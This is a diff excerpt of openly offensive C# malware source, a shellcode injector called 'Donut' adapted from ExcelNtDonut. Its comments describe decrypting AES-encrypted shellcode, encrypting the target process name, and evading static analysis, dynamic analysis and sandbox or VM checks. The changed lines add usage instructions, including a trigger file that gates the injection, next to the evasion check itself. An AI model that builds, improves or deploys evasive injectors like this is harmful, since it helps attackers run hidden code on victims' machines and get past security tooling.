@@ -1,5 +1,5 @@
 //This is a c# injector that holds an encrypted shellcode and decrypts the shellcode before injecting.
-//This injector also encrypted the process_name in which shellcode will be injected as further obfuscation.
+//This injector also encrypts the process_name in which shellcode will be injected as further obfuscation.
 //This encryption/decryption process is used  to bypass static analysis and to some extent dynamic analysis
 //The injection template has been found and modified from ExcelNtDonut, hence the modified malware name is Donut.
 //The AES_shellcode_encryptor had been provide in the repository: https://github.com/shaddy43/AES_Shellcode_Encryptor
@@ -104,6 +104,7 @@ public class Test
 
         //This condition has been added to bypass sandbox/VM or even dynamic analysis detection
         //You can add a path to a file that is not necessarily present in sandboxes or VM then shellcode will not be decrypted or injected!
+        //For this program to successfully inject, create a file named "a.txt" in the same working directory as this injector.
         string cwd_path = Directory.GetCurrentDirectory() + "/a.txt";
         if (File.Exists(cwd_path))
         {
